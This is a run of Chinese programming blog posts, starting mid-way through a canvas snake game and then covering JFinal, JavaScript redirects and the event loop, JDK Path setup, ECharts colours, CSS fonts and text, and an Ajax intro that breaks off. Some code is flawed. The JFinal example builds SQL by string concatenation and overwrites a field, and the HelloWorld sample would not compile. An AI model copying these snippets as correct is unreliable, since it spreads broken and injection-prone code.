        var canvas = document.getElementById("canvas");
        var draw = canvas.getContext('2d');
        //清除原图形
        draw.clearRect(0, 0, WIDTH, HEIGHT);
        draw.strokeStyle = "red";
        draw.strokeRect(0, 0, WIDTH, HEIGHT);
    }
    
    //创建食物 
    function createFood() {
        if (foods.length < TOTAL_FOOD) {
            var x = Math.round(Math.random()*(WIDTH/SNACK_WIDTH-1))*SNACK_WIDTH;
            var y = Math.round(Math.random()*(HEIGHT/SNACK_HEIGHT-1))*SNACK_HEIGHT;
            if (points.indexOf(x+y*WIDTH) == -1) {
                var newFood = new food(x, y);
                //alert(newFood.x + "****" + newFood.y);
                var canvas = document.getElementById("canvas");
                var draw = canvas.getContext('2d');
                draw.fillStyle = "green";
                draw.fillRect(x, y, SNACK_WIDTH, SNACK_HEIGHT);
                foods.push(newFood);
                handlePoints(x, y, 0);
            }
        }
    }
    
    //创建石头
    function createStone() {
        if (stones.length < TOTAL_STONE) {
            var x = Math.round(Math.random()*(WIDTH/SNACK_WIDTH-1))*SNACK_WIDTH;
            var y = Math.round(Math.random()*(HEIGHT/SNACK_HEIGHT-1))*SNACK_HEIGHT;
            if (points.indexOf(x+y*WIDTH) == -1) {
                var newStone = new stone(x, y);
                var canvas = document.getElementById("canvas");
                var draw = canvas.getContext('2d');
                draw.fillStyle = "#663300";
                draw.beginPath();   
                draw.arc(x+SNACK_WIDTH*0.5, y+SNACK_HEIGHT*0.5, SNACK_WIDTH*0.5+1, 0, Math.PI*2, true);     
                draw.closePath();                        
                draw.fill();
                stones.push(newStone);
                handlePoints(x, y, 0);
            }
        }
    }
    
    //刷新场景
    function refresh() {
        var canvas = document.getElementById("canvas");
        var draw = canvas.getContext('2d');
        //清除原图形
        draw.clearRect(1, 1, WIDTH-2, HEIGHT-2);
        
        /*** 边界  ***/
        draw.strokeStyle = "red";
        draw.strokeRect(0, 0, WIDTH, HEIGHT);
        
        var i;
        /*** 食物   ***/
        draw.fillStyle = "green";
        for (i = 0; i < foods.length; i++) {
            draw.fillRect(foods[i].x, foods[i].y, SNACK_WIDTH, SNACK_HEIGHT);
        }
        
        /*** 石头  ***/
        draw.fillStyle = "#663300";
        for (i = 0; i < stones.length; i++) {
            draw.beginPath();   
            draw.arc(stones[i].x+SNACK_WIDTH*0.5, stones[i].y+SNACK_HEIGHT*0.5, SNACK_WIDTH*0.5+1, 0, Math.PI*2, true);     
            draw.closePath();                        
            draw.fill();
        }
        
        /***  贪吃蛇    ***/
        draw.fillStyle = "blue";                   
        draw.beginPath();   
        //圆心x坐标|圆心y坐标|半径|始|PI为圆周率，Math.PI*2为画圆|true为时针方向：逆时针，0为顺时针
        draw.arc(snacks[0].x+SNACK_WIDTH*0.5, snacks[0].y+SNACK_HEIGHT*0.5, SNACK_WIDTH*0.5+1, 0, Math.PI*2, true);     
        draw.closePath();                        
        draw.fill(); 
        for (i = 1; i < snacks.length; i++) {
            draw.fillRect(snacks[i].x, snacks[i].y, SNACK_WIDTH, SNACK_HEIGHT);
        }
    }

    //游戏开始
    function play() {
        createGround();
        
        for (var i = 2; i > 0; i--) {
            var newSnack = new snack(SNACK_WIDTH*i, SNACK_HEIGHT);
            snacks.push(newSnack);
            handlePoints(newSnack.x, newSnack.y, 0);
        }
        refresh();
        
        document.onkeydown = keyDown;
        timeMoveId = setInterval(move, TIME_MOVE); 
        timeFoodId = setInterval(createFood, TIME_FOOD); 
        timeStoneId = setInterval(createStone, TIME_STONE); 
    }
    
    //游戏结束
    function end() {
        clearInterval(timeMoveId);  
        clearInterval(timeFoodId);  
        clearInterval(timeStoneId);  
        switchStatus = 0;
        changeMove = "right";
        currentMove = "right";
        points.length = 0;
        snacks.length = 0;
        foods.length = 0;
        stones.length = 0;
        moveing = false;
        document.getElementById("switch").value = "开始";
        document.getElementById("content").value = "游戏结束";
        alert("游戏结束");
    }
    
</script>

</html>



版权声明：本文为博主原创文章，未经博主允许不得转载。

JFanal框架介绍
最近有个项目使用了JFanal框架,我觉得挺好用.这篇文章介绍我的具体使用感受.如果想要了解JFanal,请至官网下载文档和demo.
 
我在项目中使用了JFanal框架如下东东:

路由

获取请求参数

设置属性以及视图中获取属性

模型与数据库

渲染

分页(Pagination)

 
有些技术可能有普遍的使用需求,但是我在这个项目中没有使用到:

ajax

 
下面一一介绍
路由
基于JFinal的web项目需要创建一个继承自JFinalConfig类的子类,该类用于对整个web项目进行配置.
来自<<jfinal-2.0-manual>>2.1 JFinalConfig概述
 
/**
 * 配置路由
 */
@Override
public voidconfigRoute(Routes me) {

me.add("/",IndexController.class,"/index");        //第三个参数为该Controller的视图存放路径

me.add("/blog",BlogController.class);        //第三个参数省略时默认与第一个参数值相同，在此即为 "/blog"
}
 
注意第三个参数缺省为index.因此BlogController类中实际处理/blog请求的是index函数.该函数没有参数,返回值为void.
publicvoid index() {
}
 
那么如何处理诸如/blog/save请求呢?BlogController再实现一个没有参数,返回值为void的save函数.
 
获取请求参数
Controller提供了getPara系列方法用来从请求中获取参数.
来自<<jfinal-2.0-manual>>3.3 Controller getPara系列方法
 
get和post方法请求都使用这种方式获取.处理请求方法函数中
Stringtitle = getPara("title");
 
设置属性以及视图中获取属性
使用setAttr系列函数设置属性
String prodNm =getPara("prodNm");
setAttr("prodNm",prodNm);
 
视图中通过如下方式获取属性
${(prodNm)!}
注意请不要通过${prodNm}方式获取属性,如果prodNm为null,那么浏览器渲染网页到此处时会报错并停止渲染.
 
模型与数据库
基于ActiveRecord的Model无需定义属性,无需定义getter,setter方法
来自<<jfinal-2.0-manual>>5.3 ActiveRecord Model
 
初次使用感觉挺神奇,挺方便.当然如同demo那样,有哪些字段最好在注释中说明清楚.
publicclass
Blog extends Model<Blog> {

public static final Blog me = new
Blog();
}
 
服务组件中
Blog
blog = Blog.me.findFirst(sql);
sql语句除了从单表中获取,也可以从多表中获取.
 
使用Db与Record类时,无需对数据库进行映射,Record相当于一个通用的Model.
来自<<jfinal-2.0-manual>>5.4 ActiveRecord JFinal独创的Db+Record模式
在实际使用中,我发现Db+Record模式也挺好用.临时需要获取某些字段又不想再麻烦创建一个模型时使用.
RecordcustomTypeName = Db.findFirst(sql);
StringstrCustomTypeName =customTypeName.getStr("customTypeName");
 
渲染
render系列方法将渲染不同类型的视图并返回给客户端.
来自<<jfinal-2.0-manual>>3.8 Controller render系列方法
 
这个项目控制器处理请求函数中只做三件事:

获取请求参数.

获取服务组件调用方法,返回模型或基本类型,设置属性.
渲染.
 
在渲染系列方法除了render("index.html")之外,我还发现renderJson()特别好用,它会将所有通过setAttr设置的变量转换成json数据并渲染.在开发视图之前,先将所有页面需要的属性设置,然后调用renderJson()渲染成json数据,检查数据,确保数据OK之后再开发视图.
 
分页
分页文档中没有介绍,但是demo中有.
step1
请将Jfanal框架的_paginate.html拷贝至项目WebRoot/common文件夹下.
 
step2
服务组件中提供返回值为Page<Record>的函数
publicPage<Record> paginate(intpageNumber, int pageSize) {

return Db.paginate(pageNumber, pageSize, sql,
sqlExcept);
}
注意我使用的是Db+Record模式,读者也可以使用demo中介绍的Db+Model模式.
 
step3
在控制器请求处理函数中调用
BlogService
blogServ =new BlogService();
setAttr("blogPage",blogServ.paginate(getParaToInt(0,
 1), 10));
 
step4
渲染视图中添加
<!-- 分页区域 -->
<#include"/common/_paginate.html" />
<@paginatecurrentPage=blogPage.pageNumbertotalPage=blogPage.totalPageactionUrl="/blog/"urlParas="?id=${(id)!}"/>
 
注意:JFanal框架对于多表联合查询没有优化,如果使用了多表联合查询,在大数据量情况下,效率令人抓狂.如需从多表中获取数据,请先从单表中获取
Page<Record>recordPage;
然后采用如下方法获取多表数据.
 
for(Recordr :
recordPage.getList()){

String sql2 ="select * from
table2where id="+r.getStr("foreignId");

Object table2Field1="空";

Object table2Field2="空";

if(Db.find(sql2).isEmpty()){

}else{
Recordr2 = Db.findFirst(sql2);
table2Field1=r2.get("field1");
table2Field2=r2.get("field2");

}

r.set("table2Field1",
table2Field1);

r.set("table2Field1",table2Field2);
}

版权声明：本文为博主原创文章，未经博主允许不得转载。

JavaScript实现页面跳转的五种方式
JavaScript实现页面跳转的五种方式第一种：<script type="text/javascript" language="javascript"> window.location.href="login.jsp?backurl="+window.location.href;</script>第二种：<script type="text/javascript" language="javascript"> alert("返回"); window.history.back(-1);</script>第三种：<script type="text/javascript" language="javascript">window.navigate("http://www.javaweb.cc");</script>第四种：<script type="text/javascript" language="JavaScript">self.location='top.htm';</script>第五种：<script type="text/javascript" language="javascript">alert("非法访问！"); top.location='http://javaweb.cc';</script></strong>

版权声明：感觉我写的还算不错的的话希望你能够动动你的鼠标和键盘为我点上一个赞或是为我奉献上一个评论，在下感激不尽!_______________________________________________________欢迎转载，希望在你转载的同时，添加原文地址，谢谢配合

【JS】JavaScript引擎的内部运行机制
﻿﻿
最近在复习JavaScript，看到setTimeout函数时，想起以前刚学时，在一本书上看过setTimeout()里的回调函数执行的间隔时间有昌不是后面设置的值，以前没想太多，网上看了JS大神的解释，整理记录下JavaScript引擎的内部运行机制。
首先看一段小程序：
<script>
      alert('第1');
      setTimeout(function(){alert('第2');}, 2000);
      alert('第3');
</script>
输出顺序是：第1，第3，第2；再来看一段小程序：
<script>
      alert('第1');
      setTimeout(function(){alert('第2')}, 0);
      alert('第3');
</script>
输出顺序还是：第1，第3，第2；为什么不是第1，第2，第3；setTimeout的间隔时间设置为0不就是立即执行吗？在此引出JavaScript的运行机制：Event
 Loop（貌似译为事件轮询）。



JavaScript的任务队列
        因为JavaScript是单线程的，所有的任务只能是一个接一个的执行，但是当遇像IO这样的读取一些大文件时就会出现后一个任务长时间处于等待状态，要等到前一个任务执行完才能开始后一个任务。
因为这样，JavaScript也设计为主线程可以先不管IO设备，先执行后面的任务，等IO设备返回了结果，再回去继续执行。
        因此，在JavaScript中，所有的任务可以分为两种：一是同步任务（synchronous）；二是异步任务（asynchronous）。同步任务就是：在主线程上，必须等前一个任务执行完，才能执行后一个任务；异步任务则是：不进入主线程，而是进入“任务队列”（task
 queue）的任务，主线程只有在得到“任务队列”的通知，某个异步任务可以执行，该异步任务才会进入主线程执行。

其实“任务队列”就是一个事件的队列，主线程读取“任务队列”，就是读取里面的事件。这些事件一般包括IO设备的事件、点击、滚动事件，凡是指定过回调函数（callback），这些事件发生时就会进入“任务队列”。异步任务必须指定回调函数，主线程执行异步任务，就是执行对应的回调函数。
oText.innerText = '...';

比如在某一页面中，执行了上面这一代码后，DOM的内容会发生改变，接着系统触发DOM Changed事件，产生异步回调，回调函数被添加到“任务队列”中。


Event
 Loop
1.同步任务在主线程上执行会形成一个“执行栈”（execution context stack）;
2.异步任务在“任务队列”里有运行结果就会在“任务队列”里置一事件（Event）；
3.当“执行栈”中的同步任务都执行完后，“任务队列”中有运行结果（事件，比如：Mouse Clicks、Key Presses、定时事件等）的异步任务就会进入“执行栈”，开始执行；
主线程从“任务队列”读取事件的过程是不断循环的，这种机制就称为Event Loop。


Event Loop图解：

只有“执行栈”中任务执行完了，就会去读取“任务队列”，执行各事件相对应的回调函数。


现在应该明白开篇中，为什么setTimeout的间隔时间设置为0却最后执行了吧，因为要等“执行栈”中的代码执行完后，才会去执行“任务队列”中的回调函数。










Author：顾故

Sign：别输给曾经的自己










版权声明：本文为博主原创文章，未经博主允许不得转载。

找不到要编译的文件——path环境变量配置
        隔了段时间没有学习j2se，写了一段demo发现编译不成功，找不到需要编译的文件了，以一个最简单的程序为例，HelloWorld.java的程序
解决方法：
①判断JDK安装是否正确
       先来看看JDK安装的对不对，我的JDK安装的是1.8.0_45版本的，放在了C盘，找到C:\jdk1.8.0_45\bin后，输入java


出现了下图，说明JDK安装正确！



查看一下java的编译功能是否可以用：输入javac

出现以上内容，说明java的编译功能正常可用！
②编译

假设把代码放到了D盘的JAVA文件夹里，新建一个HelloWorld.java的程序
<strong><span style="font-size:18px;">public class HelloWorld
{
	public static void main(String[] args){
	system.out.println("HelloWorld");
	}
}</span></strong>


输入C:\jdk1.8.0_45\bin\javac HelloWorld.java，出现HelloWorld.class证明编译成功，但是直接输入javac HelloWorld.java，证明是环境变量Path配置有问题，找到根源。

③解决path 的问题
1、在【我的电脑】上按右键，选择【属性】
2、选择【系统属性】面板上面的【高级系统设置】选项，然后选择下面的【环境变量】 

3、选择【环境变量】中的【Path】，如果没有的话，就点击【新建】，【变量名】为Path,【变量值】为C:\jdk1.8.0_45\bin（以我的jdk安装的路径为例），点击确定即可。如果有的话，直接找到【Path】，双击，在变量值后加入[;C:\jdk1.8.0_45\bin]，“;”的目的是为了和原来的路径相隔开，点击确定，重新启动cmd既可正常运行了。





④为什么使用path变量？
        使用path变量后，只要输入对应的目录，自动对该目录下的文件查找需要编译的java文件，而不用去输入jdk的目录，使用的更方便。需要明确一点的是：需要确定是在哪个文件夹下的java文件需要javac。
总结：
        配置JDK环境和编译的步骤是很简单的，重要的了解为什么要使用path变量，没有什么问题是解决不了的！



版权声明：本文为博主原创文章，未经博主允许不得转载。

解决echart（1.4.1） 柱形图不能随着值改变颜色的问题
Echart1.4.1效果图









如果是最新的2.2.7，大家可以参照官网提供的http://echarts.baidu.com/doc/example/bar15.html 
如果是1.4.1，那么color中如果写function（params），params没有向2.2.7中那么多的参数，如果还要颜色随值变化，可以这样处理

var zrColor = require('zrender/tool/color');




var colorNo=0;
		//设置柱状图
		function setColumnChart(x_value,y_value,colorBegin,colorEnd){
			option_column.xAxis[0].data=x_value;
			option_column.series[0].data=y_value;
			option_column.series[0].itemStyle.normal.color= function(params) {
															//获取两种颜色之间渐变颜色数组
															var colorList = zrColor.getStepColors(colorBegin,colorEnd, 100);
															//获取数组中第几个值
															var item=parseInt(y_value[colorNo]);
															var curColor=colorList[item];
															//用于遍历数值数组
															colorNo++;
															//遍历完成数值，重置控制变量
															if(colorNo==y_value.length){
																colorNo=0;
															}
                        									return curColor;
                    									}
			myChart_column.setOption(option_column);  
		}



版权声明：本文为博主原创文章，未经博主允许不得转载。

CSS字体和文本
字体
是什么
字体是“文字的不同体式”或者“字的形体结构”。对于英文而言，每种字体都是由一组具有独特样式的字母、数字和符号组成的。根据外观，字体可以分为不同的类别（font collection），包括衬线字体（serif）、无衬线字体（sans-serif）和等宽字体（monospace）。每一类字体可以分成不同的字体族（font family），比如 Times 和 Helvetica。而字体族中又可以包含不同的字型（font face），反映了相应字体族基本设计的不同变化，例如 Times Roman、 Times Bold、 Helvetica Condensed 和 Bodoni italic。CSS字体属性主要描述一类字体的大小和外观，比如：使用什么字体族（是 Times，还是 Helvitica），多大字号，粗体还是斜体。

font-maily：字体簇
font-size：字体大小
font-weight：字体粗细
font-style：字体样式
font-variant：字体变化
font：字体简写

字体簇
font-family 用于设定元素中的文本使用什么字体，具体用法参考font-family，其常见应用和问题如下：

字体来源 
用户机器中安装的字体；
保存在第三方网站上的字体，如：Typeket和Google Fonts
保存在自身Web服务器上的字体，这些字体通过@font-face引入；
继承性 
font-family是可以继承的属性，因此它的值会遗传给所有后代元素。在实际应用font-family的时候，应该给整个页面设定一种主字体，然后只对那些需要使用不同字体的元素再应用 font-family。要为整个页面指定字体，可以设定 body 元素的 font-family 属性。
字体栈 
每种操作系统自带的字体不多，而且用户随时会安装和删除字体，因此不敢保证一定能应用某种字体来显示网页。为此，在指定文本的字体时，需要多列出几种后备字体，以防第一种字体无效。这个列表也叫字体栈，例如：body {font-family:"trebuchet ms", tahoma, sans-serif;}。注意，字体栈的最后一项要指定一个通用的字体类，如：sans-serif。通用的字体类有： 
serif：衬线字体，字符笔画的末端会有一些装饰线；
sans-serif：无衬线字体，字符笔画的末端没有装饰线；
monospace：等宽字体，每个字符的宽度相等（也称代码体）；
cursive：草书体或手写体；
fantasy：不能归入其他类别的字体（一般都是奇形怪状的字体）。
字体搭配 
常见搭配 
verdana, tahoma, sans-serif
helvetica, arial, sans-serif
参考文献 
better-css-font-stacks
通用字体 
PC+Mac 
serif：Georgia，Palatino/Book Antiqua，Times New Roman
Sans-Serif：Arial，Arial Black，Arial Black，Tahoma，Trebuchet MS，Verdana
Monospace：Courier New，Lucida Console/Monaco
Cursive：Comic Sans MS
Fantasy：Impact
linux
android
ios
默认字体 
chrome：Arial，Sans-Serif
IE：。。。
firefox：。。。
如果字体名像 Trebuchet MS 一样多于一个单词（有空格），应该加上引号
font-family 的值（字体名）不区分大小写

字体大小
浏览器样式表默认为每个 HTML 元素都设定了 font-size，因此你在设定 font-size 的时候，其实是在修改默认值。由于字体大小在标记层次中是可以继承的，假如你对使用的字体大小单位怎么影响继承不十分了解，那很容易碰到有些字体莫名其妙变大或变小的问题。字体的具体用法可以参考font-size，常见应用和问题如下：

字体大小的默认值：16px
绝对单位 VS 相对单位 
绝对单位： 
简介：使用像素、派卡（pica）或英寸设定字体大小，另外
优点：实际字体设定多大就多大，与祖先元素的字体大小无关。
缺点：在需要调整页面所有元素的字体大小时，必须一个一个地修改样式表中的 font-size，相当麻烦。
其他：设定绝对字体大小时，也可以使用关键字值，比如：x-small、medium、x-large等。具体可参考Using_Keywords
相对单位 
简介：使用百分比、 em 或 rem（根元素的字体大小）设定字体大小。
优点：使用相对大小后，通过调整 body 元素的字体大小，可以成比例地改变所有元素的字体大小。或者，至少能通过改变某个祖先元素，只影响它的所有子元素。在反复修改布局设计的时候，这样显然能节省时间
缺点：可能会出现意外的“连锁反应”
其他：设定相对字体大小时，也可以使用关键字值，比如：smaller、larger。
使用rem 
简介：rem(root em)是CSS3新增的字体大小单位，也是相对单位，但rem是相对于HTML根元素的单位。
优点：既可以做到只修改根元素就成比例地调整所有字体大小，又可以避免字体大小逐层复合的连锁反应。
缺点：存在浏览器兼容性问题，除了 IE8 及更早版本外，所有浏览器均已支持rem。
实际应用：对于不支持它的浏览器，需要多写一个绝对单位的声明，例如：p {font-size:14px; font-size:.875rem;}
浏览器缩放与字体大小调整对字体大小的影响 
浏览器缩放：整体调整
字体大小调整：相对单位调整，绝对单位不变

字体样式
字体样式默认是正体，也可以是斜体，具体用法参考font-style。在实际应用中，英文中的斜体主要表示强调，如果是为了表示强调设置font-style，那么在在 HTML 标记中直接使用<em>标签即可。
字体粗细
字体粗体的主要作用是表示重要，具体用法参考font-weight。 
在实际应用中，由于浏览器对font-weight的数字值实现各不相同，所以从常规字体到粗体的切换可能发生在不同的数值上——通常是 400。所以，对于font-weight属性来说，最好只用 bold 和 normal 这两个值。 
此外，HTML 元素 strong 也表示重要，而它的默样式就是粗体，如果要突出文本中的某一个字或次，请使用strong。
字体变化
font-variant属性除了normal，就只有一个值，即 small-caps——导致所有 
小写英文字母变成小型大写字母，具体用法请参考font-variant
属性简写
font 属性是一个简写形式，通过它只要一条 CSS 声明就可以设定所有字体属性，例如：p {font: bold italic small-caps .9em helvetica, arial, sans-serif;}。具体规则如下：

必须声明 font-size 和 font-family 的值
所有值必须按如下顺序声明： 
font-weight、 font-style、 font-variant 不分先后；
然后是 font-size；
然后是 font-size；

font属性除了用于字体属性的简写外，还可以给它指定一些特殊的值，如下所示：

caption：使用有标题的系统控件的文本字体（如按钮，菜单等）（CSS2）
icon：使用图标标签的字体（CSS2）
menu：使用菜单的字体（CSS2）
message-box：使用信息对话框的文本字体（CSS2）
small-caption：使用小控件的字体（CSS2）
status-bar：使用窗口状态栏的字体（CSS2）

参考文献：

font

其他属性

font-stretch
font-size-adjust

Web字体
Web字体指的是非用户机器中的字体。目前，可以通过使用@font-face规则在网页中嵌入Web字体，并且该功能已经得到了浏览器广泛支持。设定Web字体的方式如下所示：

使用Google Web Fonts或Adobe的Typekit等公共字体 
以Google Web Fonts为例，访问https://www.google.com/fonts，找到想要的字体，单击“Add To Collection”，然后单击页面底部的 Use 按钮。Google 就会生成一个指向刚刚选定字体的<link>标签，直接把它复制粘贴到你的 HTML 文件中即可。例如：<link href='https://fonts.googleapis.com/css?family=Open+Sans|Roboto' rel='stylesheet' type='text/css'>，在CSS中引用下载的字体：font-family: 'Open Sans', Roboto, sans-serif;
使用@font-face规则 
使用@font-face规则的前提是可以从网站或第三方Web服务器下载到相应的字体包，以这种方式提供的字体，会在使用该字体的页面第一次加载时被浏览器下载并缓存起来，以后就不用下载了。使用@font-face的一个问题是不同的浏览器要求的字体格式不同，具体如下所示：
Firefox/Safari/Chrome/IOS Safari4.1以上版本：OTF——OpeType，TTF——TrueType；
IE：EOT——Embedded Open Type；
IOS Safari4.1之前版本：SVG——Scalable Vector Graphics；

Font Squirrel提供了很多现成的字体包，每个字体包中都包含所有必要格式的字体和为每款浏览器提供正确格式的 CSS 代码。另外，Font Squirrel还有一个转换程序，能够把你上传的字体转换成字体包。下面就是 Font Squirrel 为 Ubuntu Titling Bold 字体生成的@font-face 代码。对于其他来源的字体，这种格式也是适用的。
@font-face {
    /*这就是将来在字体栈中引用的字体族的名字*/
    font-family:'UbuntuTitlingBold';
    src: url('UbuntuTitling-Bold-webfont.eot');
    src: url('UbuntuTitling-Bold-webfont.eot?#iefix') format('embedded-opentype'),
        url('UbuntuTitling-Bold-webfont.woff') format('woff'),
        url('UbuntuTitling-Bold-webfont.ttf') format('truetype'),
        url('UbuntuTitling-Bold-webfont.svg#UbuntuTitlingBold') format('svg');
    font-weight: normal;
    font-style: normal;
}
Web字体的其他问题：

Web字体可能导致机器中出现同名字体，以至混淆。为此，Web专家Paul Irish写过一个跨跨浏览器@font-face 的“笑脸版”，详细内容请参考bulletproof-font-face-implementation-syntax；
需要深入入了解@font-face规则的话，可以参考How to use @font-face；
除非浏览器统一支持一种字体格式，否则必须面对多种字体格式并存问题。如何使用@font-face规则处理多种字体格式，以及保证Internet Explorer取得必要的.eot格式的字体，可以参考fixing-ie9-font-face-problems。


文本
是什么
文本就是一组字或字符，比如章标题、段落正文等等，跟使用什么字体无关。 
CSS文本属性描述对文本的处理方式，比如：行高或者字符间距多大，有没有下划线和缩进。常用的CSS文本属性如下所示：

text-indent
letter-spacing
word-spacing
text-decoration
text-align
line-height
text-transform
vertical-align

文本缩进
text-indent属性设定行内盒子相对于包含元素的起点，具体用法参考text-indent，常见问题和注意点如下：

行内盒子
CSS 会把元素中的文本放在一个不可见的盒子里，比如对 p 元素中的一段文本，CSS 将其视为很长的一行，只不过在遇到容器边界时会折行。例如：
p {border:3px solid red;}
span {border:1px solid green;}

<p><span>Here is a long paragraph…</span></p>
总结：实际上缩进的是这个文本盒子的起点位置，后续的行是不会缩进的。如果需要缩进整个段落，可以使用margin或padding。
text-indent适用于块容器，包含inline-block；
text-indent是可继承的，且子元素获得的继承值并不是祖先元素设定的值，而是计算的值。示例代码如下：
.root {
    border: 1px solid black;    
    text-indent: 30px;
}
.root > div > span {
    display: inline-block;
}
<div class="root">
    <span>行内儿子节点</span>
    <div>
        <span>行内块级孙子节点</span>
    </div>
</div>
 
总结：这里没有使用百分比，所以子元素的继承值都是30px。但需要注意示例中的前后两个span，后一个span的缩进较前一个span较大，这是由于后一个span是行内块元素，继承的缩进值起作用了。
text-indent允许设定负值，注意配合padding或margin；

字符间距
letter-spacing为正值时增大字符间距，为负值时缩小间距。无论设定字体大小时使用的是什么单位，设定字符间距一定要用相对单位，以便字间距能随字体大小同比例变化。具体用法请参考[letter-spacing]。(http://css.doyoe.com/properties/text/letter-spacing.htm)
单词间距
CSS把任何两边有空白的字符和字符串都视作“单词”，纯汉字文本一段之中没有空格，因此单词间距对中文网页几乎没有用，但对中英混排段落可能有用。单词间距属性具体用法请参考word-spacing。
文本装饰
文本装饰有下划线、上划线、贯串线和闪烁等样式，具体用法可参考text-decoration
文本对齐
一般文本对齐方式有：左对齐/left、右对齐/right、居中对齐/center，以及两端对齐/justify，其中两端对齐是CSS3新增的属性。除此之外，CSS3还定义了一些额外的属性，但浏览器都不怎么支持，具体内容请参考text-align。 
在实际应用中，如果对元素设置了文本对齐属性，而对子元素是如何显示存在疑惑时，只要根据一下规则去计算即可：

文本对齐属性只适用于块容器（包含行内块元素）；
文本对齐属性是可继承的 
如果没有子元素，则文本内容直接根据父元素定义的对齐属性在父元素盒子里显示；
如果子元素是行内非块元素，将其当做文本内容处理（虽然该子元素会继承对齐属性，但是该属性不适用于行内非块元素）；
如果子元素是行内块元素，则该元素会按照父元素的文本对齐属性在父元素盒子里显示。此外，该元素会继承父元素的对齐属性，按照以上规则处理其子元素
如果子元素非行内块元素，则该元素会继承父元素的对齐属性，然后继续按照以上规则处理子元素；

行高
CSS 中的行高平均分布在一行文本的上方和下方，具体用法参考line-height。常见问题和注意点如下：

适用于所有元素，且可继承；
行高小于字体大小时，行与行之间会出现重叠；
实际应用时，要使用相对单位（百分比或乘积因子），避免使用绝对单位（如像素）——字体增大时，可能会出现行与行的重叠；
font快捷属性：以复合值的形式把 font-size 和 line-height 值写在一块，例如div#intro {font:1.2em/1.4 helvetica, arial, sans-serif;}；
文本行高为normal不代表就是1倍于字体大小

文本转换
文本转换属性用于转换元素中文本的大小写，它可以设定英文文本首字母大写、全部字母大写和全部字母小写。具体用法可参考text-transform。
垂直对齐
垂直对齐属性vertical-align以基线为参照上下移动文本， 具体用法参考vertical-align。常见问题和注意点：

垂直对齐属性只适用于行内元素；
HTML标签<sup>和<sub>有默认的上标和下标样式，但效果不是很好；
应用场景：公式或化学分子式中的上标和下标，文本中脚注的角标；

其他属性

white-space
tab-size
word-break
word-wrap
overflow-wrap
text-align-last
text-justify
text-size-adjust


最佳实战
虽然学习了字体和文本属性，但不一定能够在实际应用中搭配好字体和文本样式。文字排版讲求匀称，一般是由看不见的网格，框定页面文字的走向和布局，匀称的版式可以增强页面的可读性。
在线资源： 
- http://ilovetypography.com/ 
- http://www.thinkingwithtype.com/ 
- http://webtypography.net/

            $(function () {
                $('pre.prettyprint code').each(function () {
                    var lines = $(this).text().split('\n').length;
                    var $numbering = $('<ul/>').addClass('pre-numbering').hide();
                    $(this).addClass('has-numbering').parent().append($numbering);
                    for (i = 1; i <= lines; i++) {
                        $numbering.append($('<li/>').text(i));
                    };
                    $numbering.fadeIn(1700);
                });
            });
        

版权声明：本文为博主原创文章，未经博主允许不得转载。

Ajax提高篇(1)入门
学习目的:理解 Ajax 及其工作原理，构建网站的一种有效方法.Ajax 是 Asynchronous JavaScript and XML（以及 DHTML 等）的缩写.下面是 Ajax 应用程序所用到的基本技术：• HTML 用于建立 Web 表单并确定应用程序其他部分使用的字段。 • JavaScript 代码是运行 Ajax 应用程序的核心代码，帮助改进与服务器应用程序的通信。 • DHTML 或 Dynamic HTML，用于动态更新表单。我们将使用 div、span 和其他动态 HTML 元素来标记 HTML。 • 文档对象模型 DOM 用于（通过 JavaScript 代码）处理 HTML 结构和（某些情况下）服务器返回的 XML。从上面可以看出,Ajax不是什么新的技术,而是几个老的技术通过新的方法结合起来,从而实现了新的效果!很多事物都是多元化的,可以说Ajax是一个新技术，也可以说Ajax是一个新的思路，一个新的架构！Ajax的基本工作原理及流程：在一般的 Web 应用程序中，用户填写表单字段并单击 Submit 按钮。然后整个表单发送到服务器，服务器将它转发给处理表单的脚本（通常是 PHP 或 Java，也可能是 CGI 进程或者类似的东西），脚本执行完成后再发送回全新的页面。该页面可能是带有已经填充某些数据的新表单的 HTML，也可能是确认页面，或者是具有根据原来表单中输入数据选择的某些选项的页面。当然，在服务器上的脚本或程序处理和返回新表单时用户必须等待。屏幕变成一片空白，等到服务器返回数据后再重新绘制。这就是交互性差的原因，用户得不到立即反馈，因此感觉不同于桌面应用程序。Ajax 基本上就是把 JavaScript 技术和 XMLHttpRequest 对象放在 Web 表单和服务器之间。当用户填写表单时，数据发送给一些 JavaScript 代码而不是 直接发送给服务器。相反，JavaScript 代码捕获表单数据并向服务器发送请求。同时用户屏幕上的表单也不会闪烁、消失或延迟。换句话说，JavaScript 代码在幕后发送请求，用户甚至不知道请求的发出。更好的是，请求是异步发送的，就是说 JavaScript 代码（和用户）不用等待服务器的响应。因此用户可以继续输入数据、滚动屏幕和使用应用程序。然后，服务器将数据返回 JavaScript 代码（仍然在 Web 表单中），后者决定如何处理这些数据。它可以迅速更新表单数据，让人感觉应用程序是立即完成的，表单没有提交或刷新而用户得到了新数据。JavaScript 代码甚至可以对收到的数据执行某种计算，再发送另一个请求，完全不需要用户干预！这就是 XMLHttpRequest 的强大之处。它可以根据需要自行与服务器进行交互，用户甚至可以完全不知道幕后发生的一切。结果就是类似于桌面应用程序的动态、快速响应、高交互性的体验，但是背后又拥有互联网的全部强大力量。XMLHttpRequest 对象：open()：建立到服务器的新请求。 send()：向服务器发送请求.abort()：退出当前请求。 readyState：提供当前 HTML 的就绪状态。 responseText：服务器返回的请求响应文本。 由于前两年的浏览器大战，使得各种浏览器获得 XMLHttpRequest 对象采用的方法有所不同。支持多种浏览器的方式创建 XMLHttpRequest 对象 var xmlHttp = false;
try {
xmlHttp = new ActiveXObject("Msxml2.XMLHTTP");
} catch (e) {
try {
    xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
} catch (e2) {
    xmlHttp = false;
}
}
if (!xmlHttp && typeof XMLHttpRequest != 'undefined') {
xmlHttp = new XMLHttpRequest();
} 这段代码的核心分为三步：1. 建立一个变量 xmlHttp 来引用即将创建的 XMLHttpRequest 对象。 2. 尝试在 Microsoft 浏览器中创建该对象：     尝试使用 Msxml2.XMLHTTP 对象创建它。     如果失败，再尝试 Microsoft.XMLHTTP 对象。 3. 如果仍然没有建立 xmlHttp，则以非 Microsoft 的方式创建该对象。 最后，xmlHttp 应该引用一个有效的 XMLHttpRequest 对象，无论运行什么样的浏览器。Ajax中的请求/响应发出请求：Ajax 应用程序中基本相同的流程：1. 从 Web 表单中获取需要的数据。 2. 建立要连接的 URL。 3. 打开到服务器的连接。 4. 设置服务器在完成后要运行的函数。 5. 发送请求。  function callServer() {
// Get the city and state from the web form
var city = document.getElementById("city").value;
var state = document.getElementById("state").value;
// Only go on if there are values for both fields
